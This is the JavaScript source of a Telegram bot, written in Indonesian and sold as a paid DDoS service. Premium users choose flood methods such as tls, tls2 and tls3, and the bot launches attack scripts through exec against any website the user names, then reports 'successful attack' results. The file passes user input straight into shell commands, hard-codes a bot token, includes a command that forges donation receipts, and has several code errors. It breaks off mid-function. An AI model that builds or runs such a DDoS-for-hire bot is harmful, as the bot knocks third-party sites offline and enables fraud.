const request = require('request');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { Telegraf } = require('telegraf');
const { Markup } = require('telegraf');
const express = require('express');
const fs = require('fs');
const { exec } = require('child_process');

const token = '7113276394:AAH7RbMcHQlLYOjcwmg2APk1HXoPOCV37t0';
const bot = new TelegramBot(token, {polling: true});
const adminId = '1891941853'; // ID admin, ganti dengan 
const premiumUserDB = './premiumUsers.json';


// Fungsi untuk memeriksa apakah pengguna adalah pengguna premium
function isPremiumUser(userId) {
  // Mengambil data dari file JSON
  const rawData = fs.readFileSync(premiumUserDB);
  const premiumUsers = JSON.parse(rawData);

  if (premiumUsers.includes(userId)) {
    return true; // Pengguna adalah pengguna premium
  } else {
    return false; // Pengguna adalah non-premium
  }
}

bot.onText(/\/clonebot (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const requestedToken = match[1];

  if (isPremiumUser(userId)) {
    // Lakukan proses cloning bot di sini menggunakan requestedToken
    bot.sendMessage(chatId, 'Proses cloning bot sedang berjalan...');
  } else {
    bot.sendMessage(chatId, 'Maaf, fitur cloning hanya dapat diakses oleh pengguna premium.');
  }
});

// Load premium users from database
if (fs.existsSync(premiumUserDB)) {
  const data = fs.readFileSync(premiumUserDB);
  premiumUsers = JSON.parse(data);
}

// Function to save premium users to database
const savePremiumUsers = () => {
  fs.writeFileSync(premiumUserDB, JSON.stringify(premiumUsers));
}

// Function to check if user is admin
const isAdmin = (userId) => {
  return userId.toString() === adminId;
}

// Function to add premium user
const addPremiumUser = (userId) => {
  premiumUsers.push(userId);
  savePremiumUsers();
}

// Function to remove premium user
const removePremiumUser = (userId) => {
  const index = premiumUsers.indexOf(userId);
  if (index > -1) {
    premiumUsers.splice(index, 1);
    savePremiumUsers();
  }
}

// Command: /addprem iduser
bot.onText(/\/addprem (.+)/, (msg, match) => {
  const userId = match[1];
  if (isAdmin(msg.from.id)) {
    addPremiumUser(userId);
    bot.sendMessage(msg.chat.id, `User ${userId} has been added to premium users.`);
  } else {
    bot.sendMessage(msg.chat.id, 'Only admin can add premium users.');
  }
});

// Command: /delprem iduser
bot.onText(/\/delprem (.+)/, (msg, match) => {
  const userId = match[1];
  if (isAdmin(msg.from.id)) {
    removePremiumUser(userId);
    bot.sendMessage(msg.chat.id, `User ${userId} has been removed from premium users.`);
  } else {
    bot.sendMessage(msg.chat.id, 'Only admin can remove premium users.');
  }
});


// Menampilkan menu bot 
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId,
    "WELCOME TO *IZZUL DDOS BOT*\n" +
    " "+ 
    "\`KLICK MENU UNTUK MELIHAT MENUNYA\`",
    {
      reply_markup: {
        keyboard: [
          [
            { text: 'menu', callback_data: 'menu'}
          ]
        ],
        resize_keyboard: true
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/METHOD/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId,
    "Pilih Salah Satu Method yg ada di Bawah Lalu Klik salah satu terus reply pesan bot dengan web time\n" +
    "Contoh Klik Tls2 Terus reply pesan ini dengan:\n" +
    "https://example.com 60",
    {
      reply_markup: {
        keyboard: [
          [
            { text: 'raw' },
            { text: 'http' },
            { text: 'tcp' },
          
        ],
        [
            { text: 'flood' },
            { text: 'mixmax' },
            { text: 'bypass'},
          
        ],
        [
            { text: 'tls' },
            { text: 'tls2' },
            { text: 'tls3' },
          
        ],
          [
            { text: 'CANCEL'},
          ]
        ],
        resize_keyboard: true
      },
      parse_mode: "Markdown"
    }
  );
});



bot.onText(/CANCEL/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "BACK TO MENU OR BACK TO ATTACK", 
    {
    reply_markup: {
      keyboard: [
        [
          { text: 'menu', callback_data: 'menu'},
          { text: 'METHODS 🔥', callback_data: 'METHODS'}
        ]
      ]
    },
    parse_mode: "Markdown"
  });
});

bot.onText(/ownermenu/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId,
    `Hii ${msg.from.username},\n` +
    "Welcome To *Izzul Bot*.\n\n" +
    "Bot Ini Adalah Bot Ddos Yang Di Gunakan Untuk Menyerang Sebuah Website Agar Website Tersebut Tidak Dapat Di Buka Atau Website Yang Kita Ddos Akan Erorr Sehingga Tidak Bisa Di buka\n\n" +
    "/addprem id - Untuk memberikan akses premium ke seseorang\n" +
    "/delprem id - Untuk menghapus akses premium seseorang" +
    "Ingin Membeli Script Bot Sini? Lansung Aja chat @IzzulMods\n\n" +
    "Bot Ini Di Buat Oleh © @IzzulMods",
    {
      reply_markup: {
        keyboard: [
          [
            { text: 'menu', callback_data: 'menu' },
            { text: 'allmenu', callback_data: 'allmenu' }
          ]
        ],
        resize_keyboard: true
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/menu/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId,
    `Hii ${msg.from.username},\n` +
    "Welcome To *Izzul Bot*.\n\n" +
    "Bot Ini Adalah Bot Ddos Yang Di Gunakan Untuk Menyerang Sebuah Website Agar Website Tersebut Tidak Dapat Di Buka Atau Website Yang Kita Ddos Akan Erorr Sehingga Tidak Bisa Di buka\n\n" +
    "Ingin Membeli Script Bot Sini? Lansung Aja chat @IzzulMods\n\n" +
    "Bot Ini Di Buat Oleh © @IzzulMods",
    {
      reply_markup: {
        keyboard: [
          [
            { text: 'usermenu', callback_data: 'usermenu' },
            { text: 'ownermenu', callback_data: 'ownermenu' },
          ],
          [
            { text: 'allmenu Botz', callback_data: 'allmenu' },
            { text: 'tutor Pakai Bot', callback_data: 'tutor'},
          ],
          [
            { text: 'METHODS 🔥', callback_data: 'METHOD' }
          ]
        ],
        resize_keyboard: true
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/\/myprem/, (msg) => {
    try {
        const data = fs.readFileSync('premiumUsers.json', 'utf8');
        const premiumUsers = new Set(JSON.parse(data)); // Baca data premiumUsers dari file JSON

        if (premiumUsers.has(msg.from.id.toString())) {
            bot.sendMessage(msg.chat.id, '🎉🥳 Selamat datang, ' + (msg.from.username || 'Unknown') + '! 🥳🎉\nKami dengan senang hati ingin memberikan sambutan khusus untuk Anda sebagai anggota premium kami. 🌟✨\n\nSebagai anggota premium, Anda akan menikmati berbagai keuntungan eksklusif yang tidak akan didapatkan oleh anggota non premium. 🎁💎 Dapatkan akses penuh ke konten premium kami, diskon khusus, layanan pelanggan prioritas, dan masih banyak lagi! 💯\n\nKami sangat berterima kasih atas kepercayaan dan dukungan Anda sebagai anggota premium. Kami berharap Anda dapat merasakan pengalaman yang luar biasa bersama kami. 🙏🤩\n\nJangan lupa untuk terus mengikuti kami di sini dan di @IzzulMods untuk mendapatkan informasi terbaru, penawaran eksklusif, dan kesempatan menarik lainnya! 📲✉️', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/IzzulMods'
                        }]
                    ]
                }
            });
        } else {
            bot.sendMessage(msg.chat.id, 'Hallo ' + (msg.from.username || 'Unknown') + '\nJika Anda belum menjadi anggota premium, jangan khawatir! Anda juga dapat menikmati pengalaman yang luar biasa dengan mengupgrade ke keanggotaan premium kami. Silakan hubungi @IzzulMods untuk informasi lebih lanjut. 💼💰\nTerima kasih atas perhatian dan selamat bergabung dengan komunitas premium kami! 🎊🙌\n\n#PremiumMember #ExclusiveExperience #JoinTheCommunity', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/IzzulMods'
                        }]
                    ]
                }
            });
        }
    } catch (err) {
        console.error('Error reading premiumUsers data', err.message);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat memeriksa status premium.');
    }
});

bot.onText(/\/getid/, (msg) => {
  const chatId = msg.chat.id;
  const user_id = msg.from.id;
  const usernames = msg.from.username;
  bot.sendMessage(msg.chat.id, `Username: ${usernames}\nUser ID: ${user_id}`)
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'AKUN TELE OWNER 🤖', url: 'https://t.me/IzzulMods' }
          ]
        ]
      }
      parse_mode: "Markdown"
    }
});

bot.onText(/usermenu/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId,
    `Hii ${msg.from.username},\n` +
    "Welcome To *Izzul Bot*.\n\n" +
    "Bot Ini Adalah Bot Ddos Yang Di Gunakan Untuk Menyerang Sebuah Website Agar Website Tersebut Tidak Dapat Di Buka Atau Website Yang Kita Ddos Akan Erorr Sehingga Tidak Bisa Di buka\n\n" +
    "/getid - Untuk Ambil Id akun telegram anda" +
    "/cekprem - Untuk cek status premium akun seseorang menggunakan Id" +
    "/myprem - Untuk cek status premium akun telegram anda\n\n" +
    "Ingin Membeli Script Bot Sini? Lansung Aja chat @IzzulMods\n\n" +
    "Bot Ini Di Buat Oleh © @IzzulMods",
    {
      reply_markup: {
        keyboard: [
          [
            { text: 'informasi tentang bot ini', callback_data: 'info' },
            { text: 'tutorial Pakai Bot', callback_data: 'tutor'},
          ],
          [
            { text: 'menu', callback_data: 'menu' },
            { text: 'allmenu', callback_data: 'allmenu'},
          ],
          [
            { text: 'METHODS 🔥', callback_data: 'METHOD' }
          ]
        ],
        resize_keyboard: true
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/\/info/, (msg) => {
  const chatId = msg.chat.id;
        bot.sendMessage(chatId, 'Hii Kak Script Bot Ddos Ini Di Kembangkan Oleh Owner Saya Berikut Information Tentang Script Ini\n\nJenis Script : Bot Ddos\nOwner : @IzzulMods\nVersion : 1.0\nIf you want to buy source. Contact @IzzulMods');
      });
      
bot.onText(/\/owner/, (msg) => {
  const chatId = msg.chat.id;
  const userttox = msg.from.username;
        bot.sendMessage(chatId, `Hai ${userttox} 👋, Lagi Nyari Owner Ya kak?? Berikut Username Owner ⬇️\n@IzzulMods\n⬆️Di Atas Adalah Owner Bot Ini`);
      });      

//menu chenel 
bot.onText(/TESTIOMI/, (msg) => {
  const chatId = msg.chat.id;

  // Menampilkan chenel
  bot.sendMessage(chatId, "LINK TESTIOMI SAYA ADA DI BAWAH👇",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Click This Button To Join the Testiomi Group, my bot owner', url: 'https://t.me/testizzul' }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});



bot.onText(/CONTACT/, (msg) => {
  const chatId = msg.chat.id;

  // Menampilkan chenel
  bot.sendMessage(chatId, "CONTACT SAYA ADA DI BAWAH👇",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'OWNER BOTZ DDOS', url: 'https://t.me/IzzulMods' },
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

//menu addprem

// Event handling untuk perintah /myprem
bot.onText(/tutor/, (msg) => {
    try {
        const data = fs.readFileSync('premiumUsers.json', 'utf8');
        const premiumUsers = new Set(JSON.parse(data)); // Baca data premiumUsers dari file JSON

        if (premiumUsers.has(msg.from.id.toString())) {
            bot.sendMessage(msg.chat.id, 'hai, ' + (msg.from.username || 'Unknown') + 'pencet *METHOD* lalu pilih salah satu method, jika sudah masukkan websitenya dan times nya.\n contoh:\n pencet tls3 lalu isi "https://example.com 60"', {
                reply_markup: {
                    inline_keyboard: [
                        [
                          { text: 'OWNER BOT', url: 'https://t.me/IzzulMods' },
                        ]
                    ]
                }
            });
        } else {
            bot.sendMessage(msg.chat.id, 'hai ' + (msg.from.username || 'Unknown') + '\nmaaf tidak bisa karena kamu belum menjadi user premium, mau jadi user premium?, bisa beli / sewa di saya admin @IzzulMods', {
                reply_markup: {
                    keyboard: [
                        [{
                            text: 'CONTACT',
                        }]
                    ]
                }
            });
        }
    } catch (err) {
        console.error('Error reading premiumUsers data', err.message);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat memeriksa status premium.');
    }
});

// Fungsi untuk menyimpan data premiumUsers ke dalam file JSON
function savePremiumUsersToFile(data) {
    fs.writeFile('premiumUsers.json', JSON.stringify(Array.from(data)), 'utf8', (err) => {
        if (err) {
            console.error('Error writing premiumUsers data', err.message);
        }
    });
}

// Inisialisasi bot
const MAX_MESSAGES_BEFORE_CLEAR_PROMPT = 15;
let messageCount = 0;

bot.onText(/\/clear/, (msg) => {
  const chatId = msg.chat.id;

  if (messageCount < MAX_MESSAGES_BEFORE_CLEAR_PROMPT) {
    // Menghapus riwayat obrolan bot dengan pengguna
    bot.deleteMessage(chatId, msg.message_id)
      .then(() => {
        messageCount++;
        bot.sendMessage(chatId, 'Riwayat obrolan Anda telah dihapus.');
      })
      .catch((error) => {
        console.error('Error deleting message:', error);
        bot.sendMessage(chatId, 'Maaf, terjadi kesalahan dalam menghapus riwayat obrolan.');
      });
  } else {
    bot.sendMessage(chatId, 'Anda telah menggunakan bot ini sebanyak 15 kali. Mohon bersihkan riwayat chat Anda sendiri untuk melanjutkan penggunaan bot.');
  }
});


// Fungsi untuk memeriksa apakah pengguna adalah pengguna premium
function isPremiumUser(userId) {
  // Mengambil data dari file JSON
  const rawData = fs.readFileSync('premiumUsers.json');
  const premiumUsers = JSON.parse(rawData);

  if (premiumUsers.includes(userId)) {
    return true; // Pengguna adalah pengguna premium
  } else {
    return false; // Pengguna adalah non-premium
  }
}

bot.onText(/\/myprem/, (msg) => {
    try {
        const data = fs.readFileSync('premiumUsers.json', 'utf8');
        const premiumUsers = new Set(JSON.parse(data)); // Baca data premiumUsers dari file JSON

        if (premiumUsers.has(msg.from.id.toString())) {
            bot.sendMessage(msg.chat.id, '🎉🥳 Selamat datang, ' + (msg.from.username || 'Unknown') + '! 🥳🎉\nKami dengan senang hati ingin memberikan sambutan khusus untuk Anda sebagai anggota premium kami. 🌟✨\n\nSebagai anggota premium, Anda akan menikmati berbagai keuntungan eksklusif yang tidak akan didapatkan oleh anggota non premium. 🎁💎 Dapatkan akses penuh ke konten premium kami, diskon khusus, layanan pelanggan prioritas, dan masih banyak lagi! 💯\n\nKami sangat berterima kasih atas kepercayaan dan dukungan Anda sebagai anggota premium. Kami berharap Anda dapat merasakan pengalaman yang luar biasa bersama kami. 🙏🤩\n\nJangan lupa untuk terus mengikuti kami di sini dan di @IzzulMods untuk mendapatkan informasi terbaru, penawaran eksklusif, dan kesempatan menarik lainnya! 📲✉️', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/IzzulMods'
                        }]
                    ]
                }
            });
        } else {
            bot.sendMessage(msg.chat.id, 'Hallo ' + (msg.from.username || 'Unknown') + '\nJika Anda belum menjadi anggota premium, jangan khawatir! Anda juga dapat menikmati pengalaman yang luar biasa dengan mengupgrade ke keanggotaan premium kami. Silakan hubungi @IzzulMods untuk informasi lebih lanjut. 💼💰\nTerima kasih atas perhatian dan selamat bergabung dengan komunitas premium kami! 🎊🙌\n\n#PremiumMember #ExclusiveExperience #JoinTheCommunity', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/IzzulMods'
                        }]
                    ]
                }
            });
        }
    } catch (err) {
        console.error('Error reading premiumUsers data', err.message);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat memeriksa status premium.');
    }
});

bot.onText(/\/cekprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const requestedUserId = match[1];

  if (isPremiumUser(requestedUserId)) {
    bot.sendMessage(chatId, 'ID ' + requestedUserId + ' adalah pengguna premium. 🌟🌟🌟');
  } else {
    bot.sendMessage(chatId, 'ID ' + requestedUserId + ' adalah pengguna non-premium. ⭐');
  }
});

// Fitur /cekid - Cek User ID Telegram Dari Username

//donasi
bot.onText(/\/donasi/, (msg) => {
    const saweriaLink = 'https://saweria.co/FarzMods';
    const buttonOptions = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Donasi ke Saya', url: 'https://saweria.co/irfa' }
                ]
            ]
        }
    };
    const donasiMessage = `Terima kasih telah mendukung kami melalui donasi! Jika Anda ingin memberikan donasi, silakan klik button dibawah ini 🤗`;

    bot.sendMessage(msg.chat.id, donasiMessage, buttonOptions);
});

const donasiData = {
    pesan: 'BOT BERHASIL DIAKTIFKAN \ud83e\udd17'
};

// Kemudian kirim pesan donasi yang berisi data donasi:
bot.sendMessage(adminId, `NAMA: ${donasiData.namaUser}\nID: ${donasiData.userId}\nNAMA: ${donasiData.username}\nPESAN: ${donasiData.pesan}`);

bot.onText(/\/fakedonasi (.+) (.+) (.+) (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = match[1];
  const gmail = match[2];
  const uang = match[3];
  const pesan = match[4];
  const lanjut = match[5];

  const waktu = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" });
  const id = generateUUID();

  const donasiMessage = `Donasi Baru Diterima! 🎉\n\nWaktu: ${waktu}\nID: ${id}\nTipe: donation\nTotal: Rp ${uang}\nPotongan: -3750\nNama Pengirim: ${nama}\nEmail Pengirim: ${gmail}\nPesan: ${pesan} ${lanjut}`;

  const keyboard = [
    [{
      text: "Donasi Juga",
      url: "https://saweria.co/FarzMods"
    }]
  ];

  const messageOptions = {
    reply_markup: JSON.stringify({
      inline_keyboard: keyboard
    })
  };

  bot.sendMessage(chatId, donasiMessage, messageOptions)
    .then(() => {
      bot.sendMessage(chatId, "Pesan donasi berhasil dikirim");
    })
    .catch((error) => {
      bot.sendMessage(chatId, "Gagal mengirim pesan donasi");
    });
});

function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    var r = Math.random() * 16 | 0,
      v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

//menu chekhost
function createButton(text, url) {
  return {
    text: text,
    url: url
  };
}

//menu chekhost
bot.onText(/\/ping (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-ping?host=${web}&`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/CHECKHOST/, (msg, match) => {
  const webAndTime = msg.text.split(' ');
  if (webAndTime.length === 1) {
    const web = webAndTime[0];

    // Lakukan apa yang perlu dilakukan dengan nilai-nilai yang diterima
    bot.sendMessage(chatId, `Click Link Di Bawah Jika Ingin Cek website yang sudah kamu ddos`, { reply_markup: { remove_keyboard: true } });
  } else {
    bot.sendMessage(chatId, 'Invalid input. Please enter host and time\nExample: https://example.com 60\n\nPlease choose methods again.');
  }
  const url = ``;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/\/info (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/ip-info?host=${web}`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/\/dns (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-dns?host=${web}&csrf_token=`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

//menu ddos
bot.onText(/\/itools/, (msg) => {
    try {
        const data = fs.readFileSync('premiumUsers.json', 'utf8');
        const premiumUsers = new Set(JSON.parse(data)); // Baca data premiumUsers dari file JSON

        if (premiumUsers.has(msg.from.id.toString())) {
            bot.sendMessage(msg.chat.id, 'HALLO, ' + (msg.from.username || 'Unknown') + 'Masukan Tools kalian', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/IzzulMods'
                        }]
                    ]
                }
            });
        } else {
            bot.sendMessage(msg.chat.id, 'Hallo ' + (msg.from.username || 'Unknown') + '\nJika Anda belum menjadi anggota premium, jangan khawatir! Anda juga dapat menikmati pengalaman yang luar biasa dengan mengupgrade ke keanggotaan premium kami. Silakan hubungi @IzzulMods untuk informasi lebih lanjut. 🎭\nTerima kasih atas perhatian dan selamat bergabung dengan komunitas premium kami! 💥\n\n#PremiumMember #ExclusiveExperience #JoinTheCommunity', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/IzzulMods'
                        }]
                    ]
                }
            });
        }
    } catch (err) {
        console.error('Error reading premiumUsers data', err.message);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat memeriksa status premium.');
    }
});

//menu crash
try {
  const data = fs.readFileSync('premiumUsers.json', 'utf8');
  const premiumUsers = new Set(JSON.parse(data)); // Baca data premiumUsers dari file JSON

//menu stop
bot.onText(/\/stop_raw/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Hentikan file yang sedang berjalan
    exec("pkill node raw.js");
    exec("pkill raw.js");
    exec("pkill -f node raw.js");
    exec("pkill -f raw.js");
    exec("pkill screen");
   
    bot.sendMessage(chatId, 'Berhasil menghentikan file yang sedang berjalan.');
  } else {
    bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
  }
});

bot.onText(/tls/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Premium user logic
    bot.sendMessage(chatId, '🕊️ SILAHKAN MASUKAN TARGET DAN WAKTU 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
    // Menyimpan state bahwa pengguna sedang dalam proses memasukkan informasi
    bot.once('text', (msg) => handletlssInput(msg, chatId, userId));
  } else {
    bot.sendMessage(chatId, 'You are not a premium user.');
  }
});

async function handletlssInput(msg, chatId, userId) {
  const webAndTime = msg.text.split(' ');
  if (webAndTime.length === 2) {
    const web = webAndTime[0];
    const time = webAndTime[1];

    async function checkHost() {
      try {
        const chatId = msg.chat.id;
        const response = await axios.get(web);
        const status = response.status;
        const message = `Status for ${web}: ${status}`;

        const sentMessage = await bot.sendMessage(chatId, message);
      
        setTimeout(() => {
          bot.deleteMessage(chatId, sentMessage.message_id);
        }, 10000); // Contoh: Menghapus pesan setelah 5 detik
      } catch (error) {
     
        const errorMessage = `Error checking host ${web}: ${error.message}`;
    const errorSentMessage = await bot.sendMessage(chatId, errorMessage, {
      reply_markup: {
        keyboard: [
          [{ text: 'STOP ATTACK', callback_data: 'STOP' }]
        ],
        resize_keyboard: true
      }
    });

    setTimeout(() => {
      // Menghapus pesan error setelah waktu yang ditentukan
      bot.deleteMessage(chatId, errorSentMessage.message_id);
    }, 7000);

      }
    }


    const intervalId = setInterval(() => {
      checkHost();
    }, 5000); // Setiap 60 detik
    

    setTimeout(() => {
      clearInterval(intervalId);
      bot.sendMessage(chatId, `┏━━━━━━━━━━━━━━┓\nSuccesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Tls
┗━━━━━━━━━━━━━━➤`, {reply_markup: {remove_keyboard: true}});
      bot.sendMessage(chatId, '🕊️ PERLU KEMBALI KE MENU ATAU ATTACK? 🕊️', {reply_markup: {keyboard: [[{text: 'menu', callback_data: 'menu'}, {text: 'METHODS 🔥', callback_data: 'METHODS'}]], resize_keyboard: true}})
    }, time * 1000);

    exec(`node tls.js ${web} ${time} 64 10`, (error, stdout, stderr) => {
      if (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }
      if (stderr) {
        bot.sendMessage(chatId, `Error: ${stderr}`);
        return;
      }
      bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━┓
    Succesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Tls
┗━━━━━━━━━━━━━━➤  `, 
      { 
      reply_markup: 
      {
       keyboard: [ 
       [
       {text: 'STOP ATTACK', callback_data: 'STOP'}
       ]
       ], resize_keyboard: true
       }
       });
       checkHost()
    });
  } else {
    bot.sendMessage(chatId, '🕊️ TARGET DAN WAKTU TIDAK VALID, SILAHKAN MASUKAN TARGET DAN WAKTU KEMBALI 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
  }
}

bot.onText(/tls2/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Premium user logic
    bot.sendMessage(chatId, '🕊️ SILAHKAN MASUKAN TARGET DAN WAKTU 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
    // Menyimpan state bahwa pengguna sedang dalam proses memasukkan informasi
    bot.once('text', (msg) => handletlss2Input(msg, chatId, userId));
  } else {
    bot.sendMessage(chatId, 'You are not a premium user.');
  }
});

async function handletlss2Input(msg, chatId, userId) {
  const webAndTime = msg.text.split(' ');
  if (webAndTime.length === 2) {
    const web = webAndTime[0];
    const time = webAndTime[1];

    async function checkHost() {
      try {
        const chatId = msg.chat.id;
        const response = await axios.get(web);
        const status = response.status;
        const message = `Status for ${web}: ${status}`;

        const sentMessage = await bot.sendMessage(chatId, message);
      
        setTimeout(() => {
          bot.deleteMessage(chatId, sentMessage.message_id);
        }, 10000); // Contoh: Menghapus pesan setelah 5 detik
      } catch (error) {
     
        const errorMessage = `Error checking host ${web}: ${error.message}`;
    const errorSentMessage = await bot.sendMessage(chatId, errorMessage, {
      reply_markup: {
        keyboard: [
          [{ text: 'STOP ATTACK', callback_data: 'STOP' }]
        ],
        resize_keyboard: true
      }
    });

    setTimeout(() => {
      // Menghapus pesan error setelah waktu yang ditentukan
      bot.deleteMessage(chatId, errorSentMessage.message_id);
    }, 7000);

      }
    }


    const intervalId = setInterval(() => {
      checkHost();
    }, 5000); // Setiap 60 detik
    

    setTimeout(() => {
      clearInterval(intervalId);
      bot.sendMessage(chatId, `┏━━━━━━━━━━━━━━┓\nSuccesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Tls-V2
┗━━━━━━━━━━━━━━➤ `, {reply_markup: {remove_keyboard: true}});
      bot.sendMessage(chatId, '🕊️ PERLU KEMBALI KE MENU ATAU ATTACK? 🕊️', {reply_markup: {keyboard: [[{text: 'menu', callback_data: 'menu'}, {text: 'METHODS 🔥', callback_data: 'METHODS'}]], resize_keyboard: true}})
    }, time * 1000);

    exec(`node tls2.js ${web} ${time} 64 10 proxy.txt`, (error, stdout, stderr) => {
      if (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }
      if (stderr) {
        bot.sendMessage(chatId, `Error: ${stderr}`);
        return;
      }
      bot.sendMessage(chatId, `
  ┏━━━━━━━━━━━━━━┓
    Succesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Tls-V2
┗━━━━━━━━━━━━━━➤  `, 
      { 
      reply_markup: 
      {
       keyboard: [ 
       [
       {text: 'STOP ATTACK', callback_data: 'STOP'}
       ]
       ], resize_keyboard: true
       }
       });
       checkHost()
    });
  } else {
    bot.sendMessage(chatId, '🕊️ TARGET DAN WAKTU TIDAK VALID, SILAHKAN MASUKAN TARGET DAN WAKTU KEMBALI 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
  }
}

bot.onText(/tls3/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Premium user logic
    bot.sendMessage(chatId, '🕊️ SILAHKAN MASUKAN TARGET DAN WAKTU 🕊️\nCONTOH: https://example.com 60\n\nBOT SEDANG MELALUKAN DDOS🕊️.');
    // Menyimpan state bahwa pengguna sedang dalam proses memasukkan informasi
    bot.once('text', (msg) => handletlss3Input(msg, chatId, userId));
  } else {
    bot.sendMessage(chatId, 'You are not a premium user.');
  }
});

async function handletlss3Input(msg, chatId, userId) {
  const webAndTime = msg.text.split(' ');
  if (webAndTime.length === 2) {
    const web = webAndTime[0];
    const time = webAndTime[1];

    async function checkHost() {
      try {
        const chatId = msg.chat.id;
        const response = await axios.get(web);
        const status = response.status;
        const message = `Status for ${web}: ${status}`;

        const sentMessage = await bot.sendMessage(chatId, message);
      
        setTimeout(() => {
          bot.deleteMessage(chatId, sentMessage.message_id);
        }, 10000); // Contoh: Menghapus pesan setelah 5 detik
      } catch (error) {
     
        const errorMessage = `Error checking host ${web}: ${error.message}`;
    const errorSentMessage = await bot.sendMessage(chatId, errorMessage, {
      reply_markup: {
        keyboard: [
          [{ text: 'STOP ATTACK', callback_data: 'STOP' }]
        ],
        resize_keyboard: true
      }
    });

    setTimeout(() => {
      // Menghapus pesan error setelah waktu yang ditentukan
      bot.deleteMessage(chatId, errorSentMessage.message_id);
    }, 7000);

      }
    }


    const intervalId = setInterval(() => {
      checkHost();
    }, 5000); // Setiap 60 detik
    

    setTimeout(() => {
      clearInterval(intervalId);
      bot.sendMessage(chatId, `┏━━━━━━━━━━━━━━┓\nSuccesfully Attack By Izzul
    🎯 Target : ${web}
    💫 Time : ${time}
    🀄 Methods : Tls-V3
┗━━━━━━━━━━━━━━➤ `, {reply_markup: {remove_keyboard: true}});
      bot.sendMessage(chatId, '🕊️ PERLU KEMBALI KE MENU ATAU ATTACK? 🕊️', {reply_markup: {keyboard: [[{text: 'menu', callback_data: 'menu'}, {text: 'METHODS 🔥', callback_data: 'METHODS'}]], resize_keyboard: true}})
    }, time * 1000);

    exec(`node tls3.js ${web} ${time} 64 10 proxy.txt`, (error, stdout, stderr) => {
      if (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }
      if (stderr) {
